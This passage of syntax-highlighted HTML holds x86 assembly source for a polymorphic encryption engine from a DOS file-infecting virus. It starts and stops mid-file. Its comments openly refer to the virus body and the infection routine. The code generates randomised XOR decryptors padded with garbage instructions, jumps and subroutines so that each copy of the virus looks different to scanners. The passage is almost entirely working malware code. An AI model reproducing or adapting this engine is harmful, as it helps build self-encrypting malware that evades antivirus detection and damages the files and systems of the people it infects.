</span><span class="sc1">;Generate some garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_garbage</span><span class="sc0">
</span><span class="sc1">;Generate a jump to virus body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">decryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Store random crypt value</span><span class="sc0">
</span><span class="sc5">get_rnd_key</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">get_rnd_key</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">clave_crypt</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc1">;Copy virus body to the working area while encrypt</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_body</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc4">+</span><span class="sc5">decryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">lenvir</span><span class="sc4">-</span><span class="sc5">decryptor</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc5">load_crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">load_crypt</span><span class="sc0">
</span><span class="sc1">;Store key without encryption</span><span class="sc0">
        </span><span class="sc6">movsb</span><span class="sc0">        
</span><span class="sc1">;Restore all regs and return to infection routine       </span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get a valid opcode for memory operations</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">get_seg_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">prog_type</span><span class="sc4">],</span><span class="sc3">"C"</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">use_ds_es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Eh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">use_ds_es</span><span class="sc4">:</span><span class="sc0">        
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">get_seg_reg</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate next decryptor instruction</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">next_decryptor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Next instruction counter</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Check if there is a subroutine witch contains next decryptor instruction</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">build_now</span><span class="sc0">
</span><span class="sc1">;If so build a call instruction to that subroutine</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_call_decryptor</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">build_now</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Else get next instruction to build</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;Generate decryption instructions just into subroutines</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">entry_from_sub</span><span class="sc0">
</span><span class="sc1">;No instruction was created so restore old pointer</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">entry_from_sub</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Entry point if calling from decryptor subroutine building</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc1">;Build instruction        </span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">instruction_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Get delta offset</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">inst_get_delta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Decode a call to next instruction and pop bp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">00E8h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5D00h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Generate some garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_garbage</span><span class="sc0">
</span><span class="sc1">;Decode a sub bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ED81h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Store address of label</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_copy</span><span class="sc4">-</span><span class="sc2">0103h</span><span class="sc0">
</span><span class="sc5">no_sub_psp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Load counter register</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">inst_load_counter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BEh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Store size of encrypted data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">lenvir</span><span class="sc4">-</span><span class="sc5">decryptor</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Load pointer to encrypted data</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">inst_load_pointer</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Load di as pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Store offset position of encrypted data</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_body</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Generate garbage in some cases</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_garbage</span><span class="sc0">
</span><span class="sc1">;Generate add reg,bp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FD03h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ch</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Decrypt one byte from encrypted data</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">inst_decrypt_one</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Decode a mov reg,byte ptr cs:[key][bp]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_seg_1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Store position of encryption key</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clave_crypt</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Decode a xor byte ptr cs:[si],reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_seg_2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Increment pointer to encrypted zone</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">inst_inc_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Decrement counter and loop</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">inst_dec_loop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Decode a dec reg instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Decode a jz </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;Generate some garbage instructions</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_garbage</span><span class="sc0">
</span><span class="sc1">;Decode a jmp to loop instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_loop</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;Generate some garbage instructions</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_garbage</span><span class="sc0">
</span><span class="sc1">;Store jz displacement</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate some garbage instructions if rnd</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">rnd_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_rnd</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">do_rnd_garbage</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">do_rnd_garbage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate a push reg and garbage and pop reg</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">do_push_g_pop</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Build a random push pop</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_push_pop</span><span class="sc0">
</span><span class="sc1">;Get pop instruction</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate a subroutine witch contains garbage code.</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">do_subroutine</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_subroutine</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">create_routine</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">create_routine</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Generate a jump instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Save address for jump construction</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;Save address of subroutine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_subroutine</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;Get subroutine address</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">        
</span><span class="sc1">;Generate some garbage code</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
</span><span class="sc1">;Insert ret instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Store jump displacement</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;Generate a subroutine witch contains one decryptor instruction</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">sub_decryptor</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_subroutine</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok_subroutine</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Do not generate the loop branch into a subroutine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_loop_sub</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">no_loop_sub</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Generate a jump instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Save address for jump construction</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc1">;Save address of subroutine</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">        
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">entry_from_sub</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_garbage</span><span class="sc0">
</span><span class="sc5">build_return</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;Insert ret instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc1">;Store jump displacement</span><span class="sc0">
